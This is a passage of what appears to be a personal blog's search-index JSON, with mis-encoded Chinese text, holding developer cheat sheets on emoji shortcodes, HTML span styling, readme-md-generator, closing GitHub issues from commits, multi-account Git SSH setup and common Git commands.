:headphones: ğŸº :trumpet: ğŸ· :saxophone: ğŸ¸ :guitar: ğŸ‘ :shoe: ğŸ‘¡ :sandal: ğŸ‘  :high_heel: ğŸ’„ :lipstick: ğŸ‘¢ :boot: ğŸ‘• :shirt: ğŸ‘• :tshirt: ğŸ‘” :necktie: ğŸ‘š :womans_clothes: ğŸ‘— :dress: ğŸ½ :running_shirt_with_sash: ğŸ‘– :jeans: ğŸ‘˜ :kimono: ğŸ‘™ :bikini: ğŸ€ :ribbon: ğŸ© :tophat: ğŸ‘‘ :crown: ğŸ‘’ :womans_hat: ğŸ‘ :mans_shoe: ğŸŒ‚ :closed_umbrella: ğŸ’¼ :briefcase: ğŸ‘œ :handbag: ğŸ‘ :pouch: ğŸ‘› :purse: ğŸ‘“ :eyeglasses: ğŸ£ :fishing_pole_and_fish: â˜•ï¸ :coffee: ğŸµ :tea: ğŸ¶ :sake: ğŸ¼ :baby_bottle: ğŸº :beer: ğŸ» :beers: ğŸ¸ :cocktail: ğŸ¹ :tropical_drink: ğŸ· :wine_glass: ğŸ´ :fork_and_knife: ğŸ• :pizza: ğŸ” :hamburger: ğŸŸ :fries: ğŸ— :poultry_leg: ğŸ– :meat_on_bone: ğŸ :spaghetti: ğŸ› :curry: ğŸ¤ :fried_shrimp: ğŸ± :bento: ğŸ£ :sushi: ğŸ¥ :fish_cake: ğŸ™ :rice_ball: ğŸ˜ :rice_cracker: ğŸš :rice: ğŸœ :ramen: ğŸ² :stew: ğŸ¢ :oden: ğŸ¡ :dango: ğŸ¥š :egg: ğŸ :bread: ğŸ© :doughnut: ğŸ® :custard: ğŸ¦ :icecream: ğŸ¨ :ice_cream: ğŸ§ :shaved_ice: ğŸ‚ :birthday: ğŸ° :cake: ğŸª :cookie: ğŸ« :chocolate_bar: ğŸ¬ :candy: ğŸ­ :lollipop: ğŸ¯ :honey_pot: ğŸ :apple: ğŸ :green_apple: ğŸŠ :tangerine: ğŸ‹ :lemon: ğŸ’ :cherries: ğŸ‡ :grapes: ğŸ‰ :watermelon: ğŸ“ :strawberry: ğŸ‘ :peach: ğŸˆ :melon: ğŸŒ :banana: ğŸ :pear: ğŸ :pineapple: ğŸ  :sweet_potato: ğŸ† :eggplant: ğŸ… :tomato: ğŸŒ½ :corn: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ Places ğŸ  :house: ğŸ¡ :house_with_garden: ğŸ« :school: ğŸ¢ :office: ğŸ£ :post_office: ğŸ¥ :hospital: ğŸ¦ :bank: ğŸª :convenience_store: ğŸ© :love_hotel: ğŸ¨ :hotel: ğŸ’’ :wedding: â›ªï¸ :church: ğŸ¬ :department_store: ğŸ¤ :european_post_office: ğŸŒ‡ :city_sunrise: ğŸŒ† :city_sunset: ğŸ¯ :japanese_castle: ğŸ° :european_castle: â›ºï¸ :tent: ğŸ­ :factory: ğŸ—¼ :tokyo_tower: ğŸ—¾ :japan: ğŸ—» :mount_fuji: ğŸŒ„ :sunrise_over_mountains: ğŸŒ… :sunrise: ğŸŒ  :stars: ğŸ—½ :statue_of_liberty: ğŸŒ‰ :bridge_at_night: ğŸ  :carousel_horse: ğŸŒˆ :rainbow: ğŸ¡ :ferris_wheel: â›²ï¸ :fountain: ğŸ¢ :roller_coaster: ğŸš¢ :ship: ğŸš¤ :speedboat: â›µï¸ :boat: â›µï¸ :sailboat: ğŸš£ :rowboat: âš“ï¸ :anchor: ğŸš€ :rocket: âœˆï¸ :airplane: ğŸš :helicopter: ğŸš‚ :steam_locomotive: ğŸšŠ :tram: ğŸš :mountain_railway: ğŸš² :bike: ğŸš¡ :aerial_tramway: ğŸšŸ :suspension_railway: ğŸš  :mountain_cableway: ğŸšœ :tractor: ğŸš™ :blue_car: ğŸš˜ :oncoming_automobile: ğŸš— :car: ğŸš— :red_car: ğŸš• :taxi: ğŸš– :oncoming_taxi: ğŸš› :articulated_lorry: ğŸšŒ :bus: ğŸš :oncoming_bus: ğŸš¨ :rotating_light: ğŸš“ :police_car: ğŸš” :oncoming_police_car: ğŸš’ :fire_engine: ğŸš‘ :ambulance: ğŸš :minibus: ğŸšš :truck: ğŸš‹ :train: ğŸš‰ :station: ğŸš† :train2: ğŸš… :bullettrain_front: ğŸš„ :bullettrain_side: ğŸšˆ :light_rail: ğŸš :monorail: ğŸšƒ :railway_car: ğŸš :trolleybus: ğŸ« :ticket: â›½ï¸ :fuelpump: ğŸš¦ :vertical_traffic_light: ğŸš¥ :traffic_light: âš ï¸ :warning: ğŸš§ :construction: ğŸ”° :beginner: ğŸ§ :atm: ğŸ° :slot_machine: ğŸš :busstop: ğŸ’ˆ :barber: â™¨ï¸ :hotsprings: ğŸ :checkered_flag: ğŸŒ :crossed_flags: ğŸ® :izakaya_lantern: ğŸ—¿ :moyai: ğŸª :circus_tent: ğŸ­ :performing_arts: ğŸ“ :round_pushpin: ğŸš© :triangular_flag_on_post: ğŸ‡¯ğŸ‡µ :jp: ğŸ‡°ğŸ‡· :kr: ğŸ‡¨ğŸ‡³ :cn: ğŸ‡ºğŸ‡¸ :us: ğŸ‡«ğŸ‡· :fr: ğŸ‡ªğŸ‡¸ :es: ğŸ‡®ğŸ‡¹ :it: ğŸ‡·ğŸ‡º :ru: ğŸ‡¬ğŸ‡§ :gb: ğŸ‡¬ğŸ‡§ :uk: ğŸ‡©ğŸ‡ª :de: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ Symbols 1ï¸âƒ£ :one: 2ï¸âƒ£ :two: 3ï¸âƒ£ :three: 4ï¸âƒ£ :four: 5ï¸âƒ£ :five: 6ï¸âƒ£ :six: 7ï¸âƒ£ :seven: 8ï¸âƒ£ :eight: 9ï¸âƒ£ :nine: ğŸ”Ÿ :keycap_ten: ğŸ”¢ :1234: 0ï¸âƒ£ :zero: #ï¸âƒ£ :hash: ğŸ”£ :symbols: â—€ï¸ :arrow_backward: â¬‡ï¸ :arrow_down: â–¶ï¸ :arrow_forward: â¬…ï¸ :arrow_left: ğŸ”  :capital_abcd: ğŸ”¡ :abcd: ğŸ”¤ :abc: â†™ï¸ :arrow_lower_left: â†˜ï¸ :arrow_lower_right: â¡ï¸ :arrow_right: â¬†ï¸ :arrow_up: â†–ï¸ :arrow_upper_left: â†—ï¸ :arrow_upper_right: â¬ :arrow_double_down: â« :arrow_double_up: ğŸ”½ :arrow_down_small: â¤µï¸ :arrow_heading_down: â¤´ï¸ :arrow_heading_up: â†©ï¸:leftwards_arrow_with_hook: â†ªï¸ :arrow_right_hook: â†”ï¸ :left_right_arrow: â†•ï¸ :arrow_up_down: ğŸ”¼ :arrow_up_small: ğŸ”ƒ :arrows_clockwise: ğŸ”„ :arrows_counterclockwise: âª :rewind: â© :fast_forward: â„¹ï¸ :information_source: ğŸ†— :ok: ğŸ”€ :twisted_rightwards_arrows: ğŸ” :repeat: ğŸ”‚ :repeat_one: ğŸ†• :new: ğŸ” :top: ğŸ†™ :up: ğŸ†’ :cool: ğŸ†“ :free: ğŸ†– :ng: ğŸ¦ :cinema: ğŸˆ :koko: ğŸ“¶ :signal_strength: ğŸˆ¹ :u5272: ğŸˆ´ :u5408: ğŸˆº :u55b6: ğŸˆ¯ï¸ :u6307: ğŸˆ·ï¸ :u6708: ğŸˆ¶ :u6709: ğŸˆµ :u6e80: ğŸˆšï¸ :u7121: ğŸˆ¸ :u7533: ğŸˆ³ :u7a7a: ğŸˆ² :u7981: ğŸˆ‚ï¸ :sa: ğŸš» :restroom: ğŸš¹ :mens: ğŸšº :womens: ğŸš¼ :baby_symbol: ğŸš­ :no_smoking: ğŸ…¿ï¸ :parking: â™¿ï¸ :wheelchair: ğŸš‡ :metro: ğŸ›„ :baggage_claim: ğŸ‰‘ :accept: ğŸš¾ :wc: ğŸš° :potable_water: ğŸš® :put_litter_in_its_place: ãŠ™ï¸ :secret: ãŠ—ï¸ :congratulations: â“‚ï¸ :m: ğŸ›‚ :passport_control: ğŸ›… :left_luggage: ğŸ›ƒ :customs: ğŸ‰ :ideograph_advantage: ğŸ†‘ :cl: ğŸ†˜ :sos: ğŸ†” :id: ğŸš« :no_entry_sign: ğŸ” :underage: ğŸ“µ :no_mobile_phones: ğŸš¯ :do_not_litter: ğŸš± :non-potable_water: ğŸš³ :no_bicycles: ğŸš· :no_pedestrians: ğŸš¸ :children_crossing: â›”ï¸ :no_entry: âœ³ï¸ :eight_spoked_asterisk: âœ´ï¸ :eight_pointed_black_star: ğŸ’Ÿ :heart_decoration: ğŸ†š :vs: ğŸ“³ :vibration_mode: ğŸ“´ :mobile_phone_off: ğŸ’¹ :chart: ğŸ’± :currency_exchange: â™ˆï¸ :aries: â™‰ï¸ :taurus: â™Šï¸ :gemini: â™‹ï¸ :cancer: â™Œï¸ :leo: â™ï¸ :virgo: â™ï¸ :libra: â™ï¸ :scorpius: â™ï¸ :sagittarius: â™‘ï¸ :capricorn: â™’ï¸ :aquarius: â™“ï¸ :pisces: â› :ophiuchus: ğŸ”¯ :six_pointed_star: â:negative_squared_cross_mark: ğŸ…°ï¸ :a: ğŸ…±ï¸ :b: ğŸ† :ab: ğŸ…¾ï¸ :o2: ğŸ’ :diamond_shape_with_a_dot_inside: â™»ï¸ :recycle: ğŸ”š :end: ğŸ”› :on: ğŸ”œ :soon: ğŸ• :clock1: ğŸ•œ :clock130: ğŸ•™ :clock10: ğŸ•¥ :clock1030: ğŸ•š :clock11: ğŸ•¦ :clock1130: ğŸ•› :clock12: ğŸ•§ :clock1230: ğŸ•‘ :clock2: ğŸ• :clock230: ğŸ•’ :clock3: ğŸ• :clock330: ğŸ•“ :clock4: ğŸ•Ÿ :clock430: ğŸ•” :clock5: ğŸ•  :clock530: ğŸ•• :clock6: ğŸ•¡ :clock630: ğŸ•– :clock7: ğŸ•¢ :clock730: ğŸ•— :clock8: ğŸ•£ :clock830: ğŸ•˜ :clock9: ğŸ•¤ :clock930: ğŸ’² :heavy_dollar_sign: Â©ï¸ :copyright: Â®ï¸ :registered: â„¢ï¸ :tm: âŒ :x: â—ï¸ :heavy_exclamation_mark: â€¼ï¸ :bangbang: â‰ï¸ :interrobang: â­•ï¸ :o: âœ–ï¸ :heavy_multiplication_x: â• :heavy_plus_sign: â– :heavy_minus_sign: â— :heavy_division_sign: ğŸ’® :white_flower: ğŸ’¯ :100: âœ”ï¸ :heavy_check_mark: â˜‘ï¸ :ballot_box_with_check: ğŸ”˜ :radio_button: ğŸ”— :link: â° :curly_loop: ã€°ï¸ :wavy_dash: ã€½ï¸ :part_alternation_mark: ğŸ”± :trident: :black_square: :black_square: :white_square: :white_square: âœ… :white_check_mark: ğŸ”² :black_square_button: ğŸ”³ :white_square_button: âš«ï¸ :black_circle: âšªï¸ :white_circle: ğŸ”´ :red_circle: ğŸ”µ :large_blue_circle: ğŸ”· :large_blue_diamond: ğŸ”¶ :large_orange_diamond: ğŸ”¹ :small_blue_diamond: ğŸ”¸ :small_orange_diamond: ğŸ”º :small_red_triangle: ğŸ”» :small_red_triangle_down: æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯","tags":[{"name":"emoji","slug":"emoji","permalink":"https://hodlyounger.github.io/tags/emoji/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€æ‰‹å†Œã€‘å‰ç«¯æ ·å¼é…ç½® style","date":"2023-10-27T01:24:02.479Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘SpanStyleList/","text":"12345678910111213141516171819202122232425262728291&lt;span class=&quot;fas faa-ring animated-hover&quot; style=&quot;border-bottom:3px solid green&quot;&gt;ã€ŠåŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²ã€‹&lt;/span&gt;2&lt;span style=&quot;text-align:center;font-size:20px;font:30px ä¹¦ä½“åŠå…°äº­ä½“;color:blueviolent;word-spacing:30px;&quot;&gt;â€œ æ—¢è®¸ä¸€äººä»¥åçˆ±ï¼Œæ„¿å°½ä½™ç”Ÿä¹‹æ…·æ…¨ â€&lt;/span&gt;3&lt;span style=&quot;class: faa-bounce animated-hover;border-bottom: 5px solid #8F81EF;&quot;&gt;[data.jsonæ–‡ä»¶é“¾æ¥](https://pan.baidu.com/s/1omzU65YMpJr0jPPFItZ7SA )&lt;/span&gt; 4 &lt;mark style=&quot;background:royalBlue;border-bottom:lightblue 2px solid;color:white;font-family:consolas&quot;&gt;å½“ä½¿ç”¨é‡åšæ—¥å¿—æ–‡ä»¶æ¥è¿›è¡Œæ•°æ®åº“æ¢å¤æ—¶ï¼ŒORACLEå°†è¯»å–å…¶ä¸­çš„é‡åšè®°å½•(åŒ…æ‹¬å…¶ä¸­çš„ä¿®æ”¹å‘é‡)ï¼Œå¹¶ä¸”å°†è¿™äº›ä¿®æ”¹ç”¨äºç›¸å…³çš„å—ä¸­ã€‚&lt;/mark&gt;5&lt;span style=&quot;background: PaleVioletRed;border-radius:10px;padding:1px 5px;color:white;font-weight:900&quot;&gt;å­˜å‚¨ç»“æ„ç®¡ç†ä¸»è¦å°±æ˜¯é€šè¿‡å¯¹è¡¨ç©ºé—´çš„ç®¡ç†æ¥å®ç°çš„&lt;/span&gt;6&lt;mark style=&quot;background:green;border-radius:10px;color:white&quot;&gt;æ•ˆæœå¦‚ä¸‹ï¼š&lt;/mark&gt;7&lt;font size=10px style=&quot;font-weight:700;font-family:&#x27;åæ–‡å½©äº‘&#x27;;color:rgb(100,190,100)&quot;&gt;åŸºæœ¬è¯­è¨€(ä¸€)&lt;/font&gt;8&lt;span style=&quot;border-bottom: 2px dashed #000000&quot;&gt;ä»£ç æ®µã€æ•°æ®æ®µã€BSSæ®µã€å †åŒºã€æ–‡ä»¶æ˜ å°„åŒºä»¥åŠæ ˆåŒº&lt;/span&gt;9&lt;div style=&quot;background:black;font:conloas;color:white;&quot;&gt; æ•°ç»„é•¿åº¦ä¸ºï¼š3&lt;br&gt; è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . .&lt;/div&gt;10&lt;mark style=&quot;color:white;background:red;font-weight:600;border_radius:100px&quot;&gt;ä½†æ•ˆç‡æ›´é«˜&lt;/mark&gt;11&lt;details&gt; &lt;summary&gt;æ›´å¤š&lt;/summary&gt; &lt;p&gt;å†…å®¹&lt;/p&gt;&lt;/details&gt; 1 ã€ŠåŠå°æ—¶æ¼«ç”»ä¸­å›½å“²å­¦å²ã€‹ 2 â€œ æ—¢è®¸ä¸€äººä»¥åçˆ±ï¼Œæ„¿å°½ä½™ç”Ÿä¹‹æ…·æ…¨ â€ 3 data.jsonæ–‡ä»¶é“¾æ¥ 4 å½“ä½¿ç”¨é‡åšæ—¥å¿—æ–‡ä»¶æ¥è¿›è¡Œæ•°æ®åº“æ¢å¤æ—¶ï¼ŒORACLEå°†è¯»å–å…¶ä¸­çš„é‡åšè®°å½•(åŒ…æ‹¬å…¶ä¸­çš„ä¿®æ”¹å‘é‡)ï¼Œå¹¶ä¸”å°†è¿™äº›ä¿®æ”¹ç”¨äºç›¸å…³çš„å—ä¸­ã€‚ 5 å­˜å‚¨ç»“æ„ç®¡ç†ä¸»è¦å°±æ˜¯é€šè¿‡å¯¹è¡¨ç©ºé—´çš„ç®¡ç†æ¥å®ç°çš„ 6 æ•ˆæœå¦‚ä¸‹ï¼š 7 åŸºæœ¬è¯­è¨€(ä¸€) 8 ä»£ç æ®µã€æ•°æ®æ®µã€BSSæ®µã€å †åŒºã€æ–‡ä»¶æ˜ å°„åŒºä»¥åŠæ ˆåŒº 9 æ•°ç»„é•¿åº¦ä¸ºï¼š3 è¯·æŒ‰ä»»æ„é”®ç»§ç»­. . . 10 ä½†æ•ˆç‡æ›´é«˜ 11 æŠ˜å  æ›´å¤š 1. åˆ—è¡¨1 2. åˆ—è¡¨2","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"æ ·å¼","slug":"æ ·å¼","permalink":"https://hodlyounger.github.io/tags/%E6%A0%B7%E5%BC%8F/"},{"name":"CSS","slug":"CSS","permalink":"https://hodlyounger.github.io/tags/CSS/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€æ‰‹å†Œã€‘Readme å·¥å…·ä½¿ç”¨æ‰‹å†Œ","date":"2023-10-27T01:24:02.478Z","path":"E_æ‰‹å†Œ/ã€æ‰‹å†Œã€‘Readmeä½¿ç”¨æ‰‹å†Œ/","text":"[toc] ReadMe readme æ˜¯ä¸€ä¸ªè‡ªåŠ¨ç”Ÿæˆ readme çš„å·¥å…· å¼€æºé¡¹ç›®åœ°å€ï¼šhttps://github.com/kefranabg/readme-md-generator å¼€æºé¡¹ç›®ä½œè€…ï¼šFranck Abgrall ç”¨æ³• npx ç”¨æ³• Make sure you have npx installed (npx is shipped by default since npm 5.2.0) Just run the following command at the root of your project and answer questions: 1npx readme-md-generator Or use default values for all questions (-y): 1npx readme-md-generator -y Use your own ejs README template (-p): 1npx readme-md-generator -p path/to/my/own/template.md You can find ejs README template examples here.ã€ Windows ç³»ç»Ÿä½¿ç”¨ 1readme Or use default values for all questions (-y): 1readme -y Use your own ejs README template (-p): 1readme -p D:my/own/template.md","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"Tools","slug":"Tools","permalink":"https://hodlyounger.github.io/tags/Tools/"},{"name":"Readme","slug":"Readme","permalink":"https://hodlyounger.github.io/tags/Readme/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"}]},{"title":"ã€GITã€‘é€šè¿‡ Commit å…³é—­ Issue","date":"2023-10-27T01:24:02.477Z","path":"E_æ‰‹å†Œ/Git/ã€GITã€‘å…³é—­issue/","text":"[toc] commitå…³é—­issue å¦‚æœè¦åœ¨ç›¸åŒä»“åº“å…³é—­ä¸€ä¸ªIssueï¼ˆå·¥å•ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢åˆ—è¡¨ä¸­çš„å…³é”®è¯å¹¶åœ¨å…¶åé¢åŠ ä¸ŠIssueç¼–å·çš„åº”ç”¨ï¼ˆ#+issueç¼–å·ï¼‰ã€‚ ä¾‹å¦‚ä¸€ä¸ªæäº¤ä¿¡æ¯ä¸­åŒ…å« Fixes #45 ï¼Œé‚£ä¹ˆä¸€æ—¦è¿™æ¬¡æäº¤è¢«åˆå¹¶åˆ°é»˜è®¤åˆ†æ”¯ï¼Œä»“åº“ä¸­çš„45å·issueå°±ä¼šè‡ªåŠ¨å…³é—­ã€‚ Issue å…³é”®å­— 123456789closeclosesclosedfixfixesfixedresolveresolvesresolved å…³é—­å¤šä¸ªissues å¦‚æœä½ åœ¨commitçš„å¼€å¤´ä½¿ç”¨å¤šä¸ªä¸Šè¿°å…³é”®å­—åŠ issueçš„å¼•ç”¨çš„è¯ï¼Œä½ å°±å¯ä»¥å…³é—­å¤šä¸ªissuesã€‚ ä¾‹å¦‚ï¼ŒThis closes #34, closes #23, and closes example_user/example_repo#42å°†ä¼šå…³é—­åŒä¸€ä¸ªä»“åº“çš„34å’Œ23å·issueä»¥åŠ example_user/example_repo ä»“åº“çš„42å·issueã€‚","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"Git","permalink":"https://hodlyounger.github.io/tags/Git/"},{"name":"Issue","slug":"Issue","permalink":"https://hodlyounger.github.io/tags/Issue/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-æ‰‹å†Œ/Git","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"ã€GITã€‘é…ç½®å¤šè´¦å·","date":"2023-10-27T01:24:02.476Z","path":"E_æ‰‹å†Œ/Git/ã€GITã€‘Gité…ç½®å¤šè´¦å·/","text":"[toc] ç”Ÿæˆå¤šä¸ªå¯†é’¥ ç”Ÿæˆå¤šä¸ªå¯†é’¥ï¼Œç”Ÿæˆæ—¶ä¿®æ”¹å¯†é’¥æ–‡ä»¶çš„æ–‡ä»¶å 1ssh-keygen -t rsa -C &quot;é‚®ç®±&quot; æ³¨æ„ä¸Šè¿°å‘½ä»¤æ‰§è¡Œå®Œä¹‹åç¬¬ä¸€ä¸ªè¾“å…¥è¦æ±‚çš„æ˜¯è¾“å…¥çš„ä¿å­˜çš„æ–‡ä»¶å ç¤ºä¾‹ï¼š 123456ssh-keygen -t rsa -C &quot;holdyounger@163.com&quot;# ä¿å­˜çš„æ—¶å€™å¯ä»¥é€‰æ‹©ä¿å­˜æ–‡ä»¶çš„åç§°è®¾ç½®ä¸º fork_hodlyounger_ssh_key# æ¥ç€æ‰§è¡Œå¦å¤–ä¸€ä¸ªè´¦å·ssh-keygen -t rsa -C &quot;å…¬å¸é‚®ç®±&quot;# ä¿å­˜çš„æ—¶å€™å¯ä»¥é€‰æ‹©ä¿å­˜æ–‡ä»¶çš„åç§°è®¾ç½®ä¸º id_rsa æ·»åŠ å¯†é’¥ 123456# åˆ‡æ¢ssh-agent bash# æ·»åŠ ssh-add ~/.ssh/fork_hodlyounger_ssh_keyssh-add ~/.ssh/id_rsa å°†å¯†é’¥æ·»åŠ åˆ°è´¦æˆ·ä¸­ ä½¿ç”¨ cat æŸ¥çœ‹å¯¹åº”è´¦æˆ·çš„ pub æ–‡ä»¶ã€‚å°†å…¶å†…å®¹æ·»åŠ åˆ°è´¦æˆ·ä¸­ã€‚ æ·»åŠ æœ¬åœ°é…ç½®æ–‡ä»¶ æ·»åŠ æœ¬åœ°é…ç½®æ–‡ä»¶ç”¨ä»¥åŒºåˆ†å¯†é’¥åœ¨å“ªä¸ªgitä¸­ä½¿ç”¨ï¼Œé…ç½®å¦‚ä¸‹æ‰€ç¤º é…ç½®æ–‡ä»¶æ›´è¯¦ç»†çš„è¯´æ˜å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç«  Gitï¼šå•å°ç”µè„‘åŒæ—¶é…ç½®å¤šä¸ªgitè´¦å· - æ€’å¼çš„èåœ - åšå®¢å›­ æ–°å»ºconfigæ–‡ä»¶ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹æ‰€ç¤ºã€‚ 1234567891011# è¿™ä¸ªæ˜¯æˆ‘ç§äººçš„GitHubHost githubHostName github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/fork_hodlyounger_ssh_key# è¿™ä¸ªæ˜¯å…¬å¸çš„GitLabHost git-biz.cnHostName git-biz.cnPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa é…ç½®æ–‡ä»¶è¡¥å……è¯´æ˜ 12345678910111213# è¿™é‡Œæ˜¯è‡ªå®šä¹‰çš„hostç®€ç§°ï¼Œä»¥åè¿æ¥è¿œç¨‹æœåŠ¡å™¨å°±å¯ä»¥ç”¨å‘½ä»¤ssh myhostHost# ä¸»æœºåå¯ç”¨ipä¹Ÿå¯ä»¥æ˜¯åŸŸå(å¦‚:github.comæˆ–è€…bitbucket.org)HostName# æœåŠ¡å™¨open-sshç«¯å£ï¼ˆé»˜è®¤ï¼š22,é»˜è®¤æ—¶ä¸€èˆ¬ä¸å†™æ­¤è¡Œï¼‰Port# é…ç½®ç™»å½•æ—¶ç”¨ä»€ä¹ˆæƒé™è®¤è¯# å¯è®¾ä¸º(publickey, password publickey, keyboard-interactive ç­‰)PreferredAuthentications# è¯ä¹¦æ–‡ä»¶è·¯å¾„ï¼ˆå¦‚~/.ssh/id_rsa_*)IdentityFile# äº‘ç«¯ä»“åº“ç™»å½•ç”¨æˆ·åUser æ ¡éªŒ ç®€å•ç‚¹å°±æ˜¯sshï¼š 1ssh -T &quot;holdyoungere@163.com&quot; è¿”å› Hi (ç”¨æˆ·å)! You've successfully authenticated, but GitHub does not provide shell access. å¼€å¤´æ ·å¼çš„è¡¨ç¤ºæ·»åŠ å¯†é’¥æˆåŠŸäº†ã€‚","tags":[{"name":"Git","slug":"Git","permalink":"https://hodlyounger.github.io/tags/Git/"},{"name":"Git/å¤šè´¦å·","slug":"Git-å¤šè´¦å·","permalink":"https://hodlyounger.github.io/tags/Git-%E5%A4%9A%E8%B4%A6%E5%8F%B7/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-æ‰‹å†Œ/Git","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"ã€GITã€‘é€ŸæŸ¥æ‰‹å†Œ","date":"2023-10-27T01:24:02.475Z","path":"E_æ‰‹å†Œ/Git/ã€GITã€‘Gité€ŸæŸ¥æ‰‹å†Œ/","text":"æŸ¥çœ‹è¿œç¨‹ä»“ 1git remote -v åˆ†æ”¯ æŸ¥çœ‹ 12345678# æŸ¥çœ‹æœ¬åœ°åˆ†æ”¯git branch# æŸ¥çœ‹è¿œç¨‹åˆ†æ”¯git branch -r# æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯git branch -a åˆ é™¤ 12345678910111213141516171819# åˆ é™¤è¿œç¨‹åˆ†æ”¯git push origin --delete [branch_name]2. åˆ é™¤æœ¬åœ°åˆ†æ”¯åŒºåˆ«git branch -d ä¼šåœ¨åˆ é™¤å‰æ£€æŸ¥mergeçŠ¶æ€ï¼ˆå…¶ä¸ä¸Šæ¸¸åˆ†æ”¯æˆ–è€…ä¸headï¼‰ã€‚git branch -D æ˜¯git branch --delete --forceçš„ç®€å†™ï¼Œå®ƒä¼šç›´æ¥åˆ é™¤ã€‚å…±åŒç‚¹éƒ½æ˜¯åˆ é™¤æœ¬åœ°åˆ†æ”¯çš„æ–¹æ³•ï¼ˆä¸åˆ é™¤è¿œç¨‹åˆ†æ”¯å‘½ä»¤ç›¸ç‹¬ç«‹ï¼Œè¦æƒ³æœ¬åœ°å’Œè¿œç¨‹éƒ½åˆ é™¤ï¼Œå¿…é¡»å¾—è¿è¡Œä¸¤ä¸ªå‘½ä»¤ï¼‰ã€‚3. gitæŸ¥çœ‹åˆ†æ”¯ï¼šæŸ¥çœ‹æœ¬åœ°åˆ†æ”¯ git branchæŸ¥çœ‹è¿œç¨‹åˆ†æ”¯ git branch -ræŸ¥çœ‹æœ¬åœ°å’Œè¿œç¨‹åˆ†æ”¯ git branch -a4.gitåˆ é™¤åˆ†æ”¯ï¼šåˆ é™¤æœ¬åœ°åˆ†æ”¯ git branch -d æœ¬åœ°åˆ†æ”¯ååˆ é™¤è¿œç¨‹åˆ†æ”¯ git push origin --delete è¿œç¨‹åˆ†æ”¯åæ¨é€ç©ºåˆ†æ”¯åˆ°è¿œç¨‹ï¼ˆåˆ é™¤è¿œç¨‹åˆ†æ”¯å¦ä¸€ç§å®ç°ï¼‰git push origin :è¿œç¨‹åˆ†æ”¯ Config 12# æŸ¥çœ‹git configgit config -l stash 123git stashgit stash pop æ‹‰å– 12# æ‹‰å–è¿œç«¯åˆ†æ”¯åˆ°æœ¬åœ°åˆ†æ”¯ Developåˆ†æ”¯åˆ°æœ¬åœ°Developåˆ†æ”¯git fetch origin Develop:Develop æŸ¥çœ‹å·²pushä½†æœªæäº¤çš„å†…å®¹ 1git cherry -v åˆå¹¶ åˆå¹¶æŸä¸ªåˆ†æ”¯ä¸Šçš„æŸä¸€ä¸ªæ–‡ä»¶ åˆ‡æ¢åˆ°å½“å‰åˆ†æ”¯ï¼ˆå³ï¼šè¦åˆå¹¶æ–‡ä»¶åˆ°çš„åˆ†æ”¯ï¼‰ 1git checkout current_branch åˆå¹¶æŒ‡å®šåˆ†æ”¯ä¸Šçš„æ–‡ä»¶åˆ°å½“å‰åˆ†æ”¯ 1git checkout --patch zhiding_branch f.txt åˆå¹¶ zhiding_branch åˆ†æ”¯ä¸Šçš„ f.txt æ–‡ä»¶åˆ° current_branch git log æœ€å¼ºè¯­å¥ 1git config --global alias.lg &quot;log --graph --pretty=format:&#x27;%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset&#x27; --abbrev-commit --date=relative&quot;","tags":[{"name":"æ‰‹å†Œ","slug":"æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/tags/%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"Git","permalink":"https://hodlyounger.github.io/tags/Git/"}],"categories":[{"name":"E_æ‰‹å†Œ","slug":"E-æ‰‹å†Œ","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/"},{"name":"Git","slug":"E-æ‰‹å†Œ/Git","permalink":"https://hodlyounger.github.io/categories/E-%E6%89%8B%E5%86%8C/Git/"}]},{"title":"ã€GITã€‘emojiæ‰‹å†Œ","date":"2023-10-27T01:24:02.473Z","path":"E_æ‰‹å†Œ/Git/ã€GITã€‘Git emojiæ‰‹å†Œ/","text":"gitmoji | An emoji guide for your commit messages emoji emoji ä»£ç  commit è¯´æ˜ ğŸ¨ (è°ƒè‰²æ¿) :art: æ”¹è¿›ä»£ç ç»“æ„ / ä»£ç æ ¼å¼ âš¡ï¸ (é—ªç”µ) ğŸ (èµ›é©¬) :zap: :racehorse: æå‡æ€§èƒ½ ğŸ”¥ (ç«ç„°) 